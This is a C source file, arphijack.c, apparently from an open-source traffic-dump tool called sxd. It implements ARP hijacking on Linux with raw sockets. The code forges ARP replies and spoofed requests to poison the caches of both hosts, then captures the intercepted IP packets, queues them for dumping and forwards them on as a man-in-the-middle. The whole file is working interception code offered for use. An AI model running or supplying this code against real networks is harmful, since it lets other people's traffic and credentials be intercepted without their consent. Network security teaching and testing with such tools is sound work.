/* sxd -- SXD Xfer Dump
 * Copyright (C) 2003 Federico Marani <flagz@users.sourceforge.net>
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version
 * 2 of the License, or (at your option) any later version.
 *
 * $Id: arphijack.c,v 1.1 2004/04/13 09:18:54 flagz Exp $
 *
 * THIS IS AN IMPLEMENTATION OF ARP HIJACKING THAT USE LINUX SYSCALLS
 * (DOESN'T USE LIBPCAP OR LIBNET) THUS IS LINUX SPECIFIC, PROBABLY
 * DOESN'T WORK ON OTHER SYSTEMS.
 * REVISION 1.1 OF THIS FILE USE LIBPCAP AND LIBNET, BUT THESE ARE TOO SLOW
 * TO WORK PROPERLY (ESPECIALLY LIBNET WHEN WE HAVE TO SEND FAKE ARP RESPONSE)
 *
 * TODO:
 * - make a general hash-array implementation that is faster than linked lists
 *   (example: hash-array is O(1) for searches, linked lists are O(N)...)
 * - rehonnest hosts with their macs
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// #include <pthread.h>

#include <sys/socket.h> /* socket syscalls */
#include <linux/if_packet.h> /* sockaddr_ll */
#include <linux/if_ether.h> /* ether packet types and eth header */
#include <net/if_arp.h> /* for ARPHDR_* */
#include <netinet/if_ether.h> /* for ether_header and ether_arp struct */

#include <sys/ioctl.h> /* ioctl() for getting infos about interface */
#include <linux/if.h> /* costants used in ioctl()s */

#include "common.h"
#include "listener.h" /* for pktqueue_append() */
#include "list-queue.h" /* for maclist - a list of true ip-mac correspondency */
#include "streamstructs.h"

#ifdef EXTENDED_INFOS
#define extprintf(...)	printf(__VA_ARGS__)
#else
#define extprintf(...)
#endif


char *hijacked_interface;

const u_char eth_bcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
u_int8_t ip_bcast[4];

u_int8_t myethaddr[6];
u_int8_t myipaddr[4];

int sock;

struct macip {
	u_int8_t mac[6];
	u_int8_t ip[4];
};

DECLARE_LIST(maclist);

#define send_raw_packet(buf, buflen)	\
	sendto(sock, buf, buflen, 0, NULL, 0)
/* struct sockaddr_ll is NULL.. is useful ?? */

/* PACKET SKELETONS */
#define ARPPKT_LEN	sizeof(struct ether_header) + sizeof(struct ether_arp)
struct ether_header *skel_arp_fakereply_eh;
struct ether_arp *skel_arp_fakereply_arp;
u_char skel_arp_fakereply[ARPPKT_LEN];

struct ether_header *skel_arp_request_eh;
struct ether_arp *skel_arp_request_arp;
u_char skel_arp_request[ARPPKT_LEN];
/* END SKELETONS */

void maclist_add(u_int8_t *mac, u_int8_t *ip) {
	struct macip *entry;
	char macstr[20];
	char ipstr[16];

	if (memcmp(mac,myethaddr,6) == 0 || memcmp(ip,myipaddr,4) == 0)
		return;   /* sanity check, we don't want our ip/mac in maclist... */

	extprintf("[maclist_add] IP=%s -> MAC=%s\n",
						ipv4addr_tostr(ipstr,ip),
						mac2string(mac,macstr));

	entry = (struct macip *)malloc(sizeof(struct macip));
	if (entry == NULL)
		fprintf(stderr,"[maclist_add] Cannot malloc mac entry\n");

	memcpy(entry->mac,mac,6);
	memcpy(entry->ip,ip,4);

	list_append(&maclist,entry);
}


int maclist_findmac_callback(void *macipentry, void *iptofind) {
	struct macip *entry = (struct macip *) macipentry;
	u_int8_t *ip = (u_int8_t *) iptofind;

	/*
	char ipsrc[16];
	char ipdst[16];
	extprintf("Comparing %s to %s -> %s\n",
			ipv4addr_tostr(ipsrc,ip),
			ipv4addr_tostr(ipdst,entry->ip),
			(memcmp(entry->ip,ip,4) == 0 ) ? "true": "false" );
	*/

	return (memcmp(entry->ip, ip, 4) == 0);
}
int maclist_findmac(u_int8_t *iptofind, u_int8_t **mactowrite) {
	struct macip *entry;

	entry = (struct macip *) list_find(&maclist, maclist_findmac_callback, (void *) iptofind);
	if (entry == NULL)
		return 0;
	*mactowrite = entry->mac;
	return 1;
}


void bridge_packet(u_char *pktbuffer, int pktbuflen) {
	u_int8_t *dstmac;
	char ipsrc[16];
	char ipdst[16];
	char macstr[20];
	struct ether_header *eth = (struct ether_header *) pktbuffer;
	struct IpHdr *ip2bridge = (struct IpHdr *) (pktbuffer + sizeof(struct ether_header));;

	if (!maclist_findmac((u_int8_t *)&(ip2bridge->daddr), &dstmac)) {
		extprintf("[bridge_packet] No MAC for IP %s, cannot bridge...\n",ipv4addr_tostr(ipdst,&(ip2bridge->daddr)));
		return;  /* no MAC corresponding to that IP.. we have captured a packet for a unreachable host... */
	}

	memcpy(eth->ether_dhost,dstmac,ETH_ALEN);
	memcpy(eth->ether_shost,myethaddr,ETH_ALEN);

	send_raw_packet(pktbuffer,pktbuflen);

	extprintf("[bridge_packet] Packet from %s to %s bridged (dstmac=%s,pktlen=%d)\n",
				ipv4addr_tostr(ipsrc,&(ip2bridge->saddr)),
				ipv4addr_tostr(ipdst,&(ip2bridge->daddr)),
				mac2string(dstmac,macstr),
				pktbuflen);

}


void send_arp_fakereply(u_char *srcip, u_char *dstmac, u_char *dstip) {
	char macsrc[20];
	char ipsrc[16];

	memcpy(skel_arp_fakereply_eh->ether_dhost,dstmac,ETH_ALEN);
	memcpy(skel_arp_fakereply_arp->arp_tha,dstmac,ETH_ALEN);
	memcpy(skel_arp_fakereply_arp->arp_spa,srcip,4);
	memcpy(skel_arp_fakereply_arp->arp_tpa,dstip,4);

	send_raw_packet(skel_arp_fakereply,ARPPKT_LEN);

	extprintf("[send_arp_fakereply] Fake reply %s is-here\n",
						ipv4addr_tostr(ipsrc,srcip));

}

void send_arp_request(u_char *srcip, u_char *dstip) {
	char ipsrc[16];
	char ipdst[16];

	memcpy(skel_arp_request_arp->arp_spa,srcip,4);
	memcpy(skel_arp_request_arp->arp_tpa,dstip,4);

	send_raw_packet(skel_arp_request,ARPPKT_LEN);

	extprintf("[send_arp_request] Request to %s claiming to be %s\n",
						ipv4addr_tostr(ipdst,dstip),
						ipv4addr_tostr(ipsrc,srcip));
}


void handle_arp(struct ether_arp *etharp) {
	if (!(ntohs(etharp->arp_pro) == ETHERTYPE_IP ))
		return;

	if (memcmp(etharp->arp_sha,myethaddr,6) == 0)
		return; /* ARP from this host..., hijacking the hijacker ...:) no,thanks... */

	switch (ntohs(etharp->arp_op)) {
		case ARPOP_REQUEST: {
			if(memcmp(etharp->arp_tha,myethaddr,6) == 0)
				break; /* Request to our MAC ignored */

			send_arp_fakereply(
				(u_char *) etharp->arp_tpa,  /* target IP address instead myipaddr  */
				(u_char *) etharp->arp_sha,  /* ARP REPLY to source MAC    */
				(u_char *) etharp->arp_spa);  /*  and source ip    */
			/* Source ARP cache poisoned */

			maclist_add(etharp->arp_sha, etharp->arp_spa);

			send_arp_request(
				(u_char *) etharp->arp_spa,  /* ARP REQUEST from source IP/my mac */
				(u_char *) etharp->arp_tpa); /* to target IP   */
				/* obtain the target MAC */
			break;
			/* Target ARP cache poisoned */
		}
		case ARPOP_REPLY: {
			maclist_add(etharp->arp_sha, etharp->arp_spa);
			break;
		}
	}
}

void build_packet_skeletons() {
	skel_arp_request_eh = skel_arp_request;
	skel_arp_request_arp = skel_arp_request + sizeof(struct ether_header);
	memcpy(skel_arp_request_eh->ether_dhost, eth_bcast, ETH_ALEN);
	memcpy(skel_arp_request_eh->ether_shost, myethaddr, ETH_ALEN);
	skel_arp_request_eh->ether_type = htons(ETH_P_ARP);
	skel_arp_request_arp->arp_hrd = htons(ARPHRD_ETHER);
	skel_arp_request_arp->arp_pro = htons(ETH_P_IP);
	skel_arp_request_arp->arp_hln = ETH_ALEN;
	skel_arp_request_arp->arp_pln = 4;
	skel_arp_request_arp->arp_op = htons(ARPOP_REQUEST);
	memcpy(skel_arp_request_arp->arp_sha,myethaddr,6);
	memset(skel_arp_request_arp->arp_tha,0,6);


	skel_arp_fakereply_eh = skel_arp_fakereply;
	skel_arp_fakereply_arp = skel_arp_fakereply + sizeof(struct ether_header);
	memcpy(skel_arp_fakereply_eh->ether_shost, myethaddr, ETH_ALEN);
	skel_arp_fakereply_eh->ether_type = htons(ETH_P_ARP);
	skel_arp_fakereply_arp->arp_hrd = htons(ARPHRD_ETHER);
	skel_arp_fakereply_arp->arp_pro = htons(ETH_P_IP);
	skel_arp_fakereply_arp->arp_hln = ETH_ALEN;
	skel_arp_fakereply_arp->arp_pln = 4;
	skel_arp_fakereply_arp->arp_op = htons(ARPOP_REPLY);
	memcpy(skel_arp_fakereply_arp->arp_sha,myethaddr,6);
}

void arphijack_main(struct listenparams *p) {
	/* vars used for receiving pkts */
	u_char pktbuffer[ETH_FRAME_LEN];
	int pktbuflen;

	struct ifreq ifr; /* used for request infos about interface */
	struct sockaddr_ll sll; /* used by bind() for binding to a specific interface */

	/* vars used for queueing pkts to pktqueue */
	struct packet *pk;
	double pkttime;
	unsigned long long int n_pkt = 0;

	/* other stuff */
	struct ether_header *eth;
	unsigned char *ether_payload;
	unsigned int ether_payloadlen;
	char macstr[20];
	char ipstr[16];
	struct timeval pkttimeval;


	if (!(p->online_mode)) {
		fprintf(stderr,"[arphijack_main] ARP Hijacking requires a network interface...\n");
		exit(1);
	}

	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (sock == -1) {
		perror("[arphijack_main] Error creating raw socket");
		exit(2);
	}

	/* Request infos about interface */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, p->ifname, sizeof(ifr.ifr_name));

	if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0)
		exit(3);

	/* prepare sockaddr_ll for binding to a particular interface and protocol */
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);


	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
		exit(4);

	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		fprintf(stderr,"[arphijack_main] ARP Hijacking works only on ethernet, sorry...\n");
		exit(5);
	}

	memcpy(myethaddr,ifr.ifr_hwaddr.sa_data,6);

	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
		exit(6);

	memcpy(myipaddr,ifr.ifr_addr.sa_data+2,4);

	if (ioctl(sock, SIOCGIFBRDADDR, &ifr) < 0)
		exit(6);

	memcpy(ip_bcast,ifr.ifr_broadaddr.sa_data+2,4);

	extprintf("[arphijack_main] [ip=%s] [mac=%s]\n",
		ipv4addr_tostr(ipstr,myipaddr),
		mac2string(myethaddr,macstr));

	if (bind(sock, (struct sockaddr *) &sll, sizeof(sll)) == -1) {
		perror("[arphijack_main] Cannot bind()");
		exit(8);
	}

	hijacked_interface = p->ifname;

	list_init(&maclist);

	build_packet_skeletons();

	eth = (struct ether_header *) pktbuffer;
	ether_payload = (unsigned char*) (pktbuffer + sizeof(struct ether_header));

	/* Start the infinite loop that read,queueappend and forward packets */
	while(1) {
		pktbuflen = recvfrom(sock, pktbuffer, ETH_FRAME_LEN, 0, NULL, NULL);
		if (pktbuflen == -1)
			continue;

		n_pkt++;

		ether_payloadlen = pktbuflen - sizeof(struct ether_header);

		if (memcmp(eth->ether_shost, myethaddr, 6) == 0) {
			extprintf("[arphijack_main] This host's eth_addr packet ignored\n");
			continue;
		}

		if ((ntohs(eth->ether_type) == ETH_P_ARP) && (ether_payloadlen == sizeof(struct ether_arp))) {
			handle_arp((struct ether_arp *) ether_payload);
		}
		else
			if ((ntohs(eth->ether_type) == ETH_P_IP) && (ether_payloadlen >= sizeof(struct IpHdr) )) {
				struct IpHdr *ip2bridge = ether_payload;
				/* Ignore broadcast packets */
				if ((memcmp(eth->ether_dhost, eth_bcast, 6) == 0) ||
				    (memcmp(&(ip2bridge->daddr), (u_char *) ip_bcast, 4) == 0)) {
					extprintf("[arphijack_main] Broadcast packet ignored\n");
					continue;
				}

				/* Ignore packets from/to localhost (myipaddr=srcip or dstip) */
				if ((memcmp(&(ip2bridge->saddr), (u_char *) myipaddr, 4) == 0) ||
				    (memcmp(&(ip2bridge->daddr), (u_char *) myipaddr, 4) == 0)) {
					extprintf("[arphijack_main] This host's IP_addr packet ignored\n");
					continue;
				}

				pk = (struct packet *)malloc(sizeof(struct packet));
				if (pk == NULL) {
					fprintf(stderr,"[arphijack_main] malloc packet failed");
					exit(9);
				}

				/* TCPDUMP-like time format... */
				if (ioctl(sock, SIOCGSTAMP, &pkttimeval) < 0)
					exit(10);
				pkttime = (double) pkttimeval.tv_usec;
				while (pkttime > 1) {
					pkttime /= 10;
				}
				pkttime = (double)(pkttime + pkttimeval.tv_sec);


				pk->n_pkt = n_pkt;
				pk->curtime = pkttime;
				memcpy(pk->pkt, ether_payload, (ether_payloadlen > IPMAX ? IPMAX : ether_payloadlen));

				pktqueue_append(pk);

				//if (!p->online_mode)
				//	pthread_yield();
				if (memcmp(eth->ether_dhost, myethaddr, 6) == 0)
					bridge_packet(pktbuffer, pktbuflen);
			}
	}
	/* not reached */
	close(sock);
}
